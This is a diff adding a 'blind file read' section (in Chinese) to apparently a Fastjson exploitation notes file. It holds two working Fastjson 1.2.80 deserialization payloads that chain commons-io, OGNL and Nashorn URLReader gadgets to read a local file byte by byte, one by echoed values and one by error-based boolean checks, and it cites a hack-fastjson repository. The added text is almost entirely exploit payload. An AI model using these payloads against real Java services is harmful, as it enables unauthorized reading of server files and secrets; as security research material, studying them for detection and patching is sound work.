@@ -139,3 +139,47 @@ parse:182, JSON (com.alibaba.fastjson)
 parse:192, JSON (com.alibaba.fastjson)
 parse:148, JSON (com.alibaba.fastjson)
 ```
+
+
+### 文件盲读
+1、commons-io + ognl + URLReader 单字节文件读取（回显情况观察数值）
+```
+{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}},"su16":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
+{
+      "@type": "org.apache.commons.io.input.BOMInputStream",
+      "delegate": {
+        "@type": "org.apache.commons.io.input.ReaderInputStream",
+        "reader": {
+          "@type": "jdk.nashorn.api.scripting.URLReader",
+          "url": "file:///Users/su18/Downloads/1.txt"
+          },
+        "charsetName": "UTF-8",
+        "bufferSize": 1024
+      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
+98]}]
+}}}},"su17" : {"$ref":"$.su16.node.p.stream"},"su18":{
+"$ref":"$.su17.bOM.bytes"}}
+```
+
+2、commons-io + ognl + URLReader 单字节文件读取（报错布尔）
+```
+[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"}},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}},
+{"su17":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
+{
+      "@type": "org.apache.commons.io.input.BOMInputStream",
+      "delegate": {
+        "@type": "org.apache.commons.io.input.ReaderInputStream",
+        "reader": {
+          "@type": "jdk.nashorn.api.scripting.URLReader",
+          "url": "file:///Users/su18/Downloads/1.txt"
+          },
+        "charsetName": "UTF-8",
+        "bufferSize": 1024
+      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
+98]}]
+}}}}},{"su18" : {"$ref":"$[2].su17.node.p.stream"}},{"su19":{
+"$ref":"$[3].su18.bOM.bytes"}},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
+              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su21" : {"$ref":"$[5].su20.node.p.stream"}}]
+```
+参考：
+https://github.com/su18/hack-fastjson-1.2.80
